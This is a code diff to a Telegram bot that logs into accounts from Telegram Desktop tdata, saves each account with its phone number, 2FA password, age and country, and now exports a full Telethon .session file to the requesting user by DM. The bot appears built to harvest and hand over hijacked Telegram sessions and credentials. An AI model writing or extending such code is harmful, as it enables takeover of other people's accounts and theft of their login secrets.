@@ -635,7 +635,7 @@ async def handle_guide_cb(client, cb):
                 sydno = await db.save_account(me.id, info)
                 await show_rar(tdata_path, message, sydno)
                 
-                await message.reply(f"Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id}) \n ID: {sydno} \n PH: +{me.phone} \n {syd} \n {nsyd}", quote=True)
+                await message.reply(f"Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id}) \n ID: {sydno} \n PH: +{me.phone} \n AGE: {info['age']}\n CTRY: {info['country']}\n {syd} \n {nsyd}", quote=True)
                 results.append(
                     f"#{sydno}\n"
                     f"Aᴄᴄᴏᴜɴᴛ Nᴀᴍᴇ: {info['name']}\n"
@@ -817,15 +817,29 @@ async def retrieve_options(client, callback_query):
         if action == "tele":
             await callback_query.message.edit("⚙️ Generating Telethon session...")
 
-            # use .session.save() or StringSession.save()
+            await tele_client.connect()
             me = await tele_client.get_me()
-            tele_string = StringSession.save(session.session)
+            session_path = f"{me.id}.session"
+            tele_client.session.save()  # ensures .session file is created
 
-            await client.send_message(
-                callback_query.from_user.id,
-                f"🔑 **Telethon session** for **{me.first_name}** (`{me.id}`):\n\n`{tele_string}`"
+            # Double-check path; for some session implementations, explicit save is needed
+            if not os.path.exists(session_path):
+                tele_client.session.save()  # ensure file exists
+
+            # Send the file
+            await client.send_document(
+                chat_id=callback_query.from_user.id,
+                document=session_path,
+                caption=f"🔑 **Telethon session file** for **{me.first_name}** (`{me.id}`)"
             )
-            return await callback_query.message.edit("✅ Telethon session sent via DM.")
+
+            
+            try:
+                os.remove(session_path)
+            except:
+                pass
+
+            return await callback_query.message.edit("✅ Telethon `.session` file sent via DM.")
         elif action == "phone":
             phone = doc.get("phone", "❌ Not saved")
             fa = doc.get("twofa", "❌ Not saved")
